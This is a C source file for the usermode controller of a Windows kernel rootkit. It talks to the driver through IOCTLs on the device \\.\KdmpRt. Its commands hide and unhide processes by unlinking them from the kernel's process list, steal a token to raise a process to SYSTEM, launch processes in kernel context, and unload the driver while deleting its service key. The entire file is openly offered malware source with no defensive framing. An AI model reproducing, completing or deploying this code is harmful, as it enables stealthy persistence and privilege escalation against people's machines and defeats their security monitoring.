/*==============================================================================
 * rootkit/usermode/controller.c
 *------------------------------------------------------------------------------
 * Usermode IOCTL Client for Rootkit Control Plane
 *
 * BUILD:
 *   cl /O2 /W3 controller.c /link ws2_32.lib
 *
 * USAGE:
 *   controller.exe ping
 *   controller.exe exec C:\\Windows\\System32\\cmd.exe
 *   controller.exe ps
 *   controller.exe hide 1234
 *   controller.exe unhide 1234
 *   controller.exe elevate 4
 *   controller.exe unload
 *
 * REQUIREMENTS:
 *   - Driver loaded and device symlink (\\.\KdmpRt) accessible
 *   - Run as Administrator
 *==============================================================================
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "..\inc\common.h"

/*==============================================================================
 * HELPER: Error Handling
 *============================================================================*/
static void die(const char* msg) {
    fprintf(stderr, "[!] %s (GetLastError=%lu)\n", msg, GetLastError());
    exit(1);
}

/*==============================================================================
 * HELPER: Open Device Handle
 *------------------------------------------------------------------------------
 * Opens the rootkit's symbolic link (\\.\KdmpRt).
 * Requires driver to be loaded and symlink created.
 *============================================================================*/
static HANDLE open_device(void) {
    /* Symlink is \\??\\KdmpRt => user path \\.\KdmpRt */
    HANDLE h = CreateFileA("\\\\.\\KdmpRt", GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) die("cannot open \\\\.\\KdmpRt");
    return h;
}

/*==============================================================================
 * HELPER: Send IOCTL
 *------------------------------------------------------------------------------
 * Wrapper for DeviceIoControl with error handling.
 *============================================================================*/
static void send_ioctl(HANDLE h, DWORD code, const void* in, DWORD in_len,
                       void* out, DWORD out_cap, DWORD* out_len) {
    DWORD br = 0;
    if (!DeviceIoControl(h, code, (LPVOID)in, in_len, out, out_cap, &br, NULL)) {
        die("DeviceIoControl");
    }
    if (out_len) *out_len = br;
}

/*==============================================================================
 * COMMAND IMPLEMENTATIONS
 *============================================================================*/

/*--------------------------------------------------------------------------
 * CMD: ping
 *   IOCTL: IOCTL_ROOTKIT_PING
 *   Tests driver responsiveness.
 *-------------------------------------------------------------------------*/
static void cmd_ping(HANDLE h) {
    unsigned char out[65536];
    DWORD n = 0;
    send_ioctl(h, IOCTL_ROOTKIT_PING, NULL, 0, out, sizeof(out), &n);
    printf("ping -> %.*s\n", (int)n, out);
}

/*--------------------------------------------------------------------------
 * CMD: exec <path>
 *   IOCTL: IOCTL_ROOTKIT_EXEC
 *   Launches a process in kernel context via ZwCreateUserProcess.
 *-------------------------------------------------------------------------*/
static void cmd_exec(HANDLE h, const char* path) {
    unsigned char out[65536];
    /* Convert ANSI path to UTF-16LE */
    WCHAR wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, MAX_PATH);
    DWORD n = 0;
    send_ioctl(h, IOCTL_ROOTKIT_EXEC, wpath,
               (DWORD)((wcslen(wpath) + 1) * sizeof(WCHAR)),
               out, sizeof(out), &n);
    printf("exec -> %.*s\n", (int)n, out);
}

/*--------------------------------------------------------------------------
 * CMD: ps
 *   IOCTL: IOCTL_ROOTKIT_PS
 *   Lists all visible processes (PID + image name).
 *-------------------------------------------------------------------------*/
static void cmd_ps(HANDLE h) {
    unsigned char out[65536];
    DWORD n = 0;
    send_ioctl(h, IOCTL_ROOTKIT_PS, NULL, 0, out, sizeof(out), &n);

    RK_PROC_ENTRY* p = (RK_PROC_ENTRY*)out;
    DWORD count = n / (DWORD)sizeof(RK_PROC_ENTRY);

    printf("%-8s %s\n", "PID", "IMAGE");
    printf("-------- ----------------\n");
    for (DWORD i = 0; i < count; i++) {
        printf("%-8u %s\n", p[i].pid, p[i].image);
    }
}

/*--------------------------------------------------------------------------
 * CMD: hide <pid>
 *   IOCTL: IOCTL_ROOTKIT_HIDE
 *   Hides process from ActiveProcessLinks (DKOM).
 *-------------------------------------------------------------------------*/
static void cmd_hide(HANDLE h, DWORD pid) {
    unsigned char out[65536];
    DWORD n = 0;
    send_ioctl(h, IOCTL_ROOTKIT_HIDE, &pid, sizeof(pid), out, sizeof(out), &n);
    printf("hide -> %.*s\n", (int)n, out);
}

/*--------------------------------------------------------------------------
 * CMD: unhide <pid>
 *   IOCTL: IOCTL_ROOTKIT_UNHIDE
 *   Restores previously hidden process to ActiveProcessLinks.
 *-------------------------------------------------------------------------*/
static void cmd_unhide(HANDLE h, DWORD pid) {
    unsigned char out[65536];
    DWORD n = 0;
    send_ioctl(h, IOCTL_ROOTKIT_UNHIDE, &pid, sizeof(pid), out, sizeof(out), &n);
    printf("unhide -> %.*s\n", (int)n, out);
}

/*--------------------------------------------------------------------------
 * CMD: elevate <pid>
 *   IOCTL: IOCTL_ROOTKIT_ELEVATE
 *   Token theft: elevates current process to target PID's token (e.g., SYSTEM).
 *-------------------------------------------------------------------------*/
static void cmd_elevate(HANDLE h, DWORD pid) {
    unsigned char out[65536];
    DWORD n = 0;
    send_ioctl(h, IOCTL_ROOTKIT_ELEVATE, &pid, sizeof(pid), out, sizeof(out), &n);
    printf("elevate -> %.*s\n", (int)n, out);
}

/*--------------------------------------------------------------------------
 * CMD: unload
 *   IOCTL: IOCTL_ROOTKIT_UNLOAD
 *   Requests driver unload and deletes service registry key.
 *-------------------------------------------------------------------------*/
static void cmd_unload(HANDLE h) {
    unsigned char out[65536];
    DWORD n = 0;
    send_ioctl(h, IOCTL_ROOTKIT_UNLOAD, NULL, 0, out, sizeof(out), &n);
    printf("unload -> %.*s\n", (int)n, out);
}

/*==============================================================================
 * MAIN
 *============================================================================*/
int main(int argc, char** argv) {
    if (argc < 2) {
        fprintf(stderr,
            "Usage: %s <command> [args]\n\n"
            "Commands:\n"
            "  ping                    - Test driver connectivity\n"
            "  exec <path>             - Execute process (e.g., C:\\Windows\\System32\\cmd.exe)\n"
            "  ps                      - List processes\n"
            "  hide <pid>              - Hide process (DKOM)\n"
            "  unhide <pid>            - Unhide process\n"
            "  elevate <pid>           - Token theft (elevate to target PID)\n"
            "  unload                  - Unload driver & delete service key\n",
            argv[0]);
        return 1;
    }

    HANDLE h = open_device();
    const char* cmd = argv[1];

    if (!strcmp(cmd, "ping")) {
        cmd_ping(h);
    }
    else if (!strcmp(cmd, "exec") && argc >= 3) {
        cmd_exec(h, argv[2]);
    }
    else if (!strcmp(cmd, "ps")) {
        cmd_ps(h);
    }
    else if (!strcmp(cmd, "hide") && argc >= 3) {
        DWORD pid = (DWORD)strtoul(argv[2], NULL, 10);
        cmd_hide(h, pid);
    }
    else if (!strcmp(cmd, "unhide") && argc >= 3) {
        DWORD pid = (DWORD)strtoul(argv[2], NULL, 10);
        cmd_unhide(h, pid);
    }
    else if (!strcmp(cmd, "elevate") && argc >= 3) {
        DWORD pid = (DWORD)strtoul(argv[2], NULL, 10);
        cmd_elevate(h, pid);
    }
    else if (!strcmp(cmd, "unload")) {
        cmd_unload(h);
    }
    else {
        fprintf(stderr, "[!] Unknown command: %s\n", cmd);
        CloseHandle(h);
        return 1;
    }

    CloseHandle(h);
    return 0;
}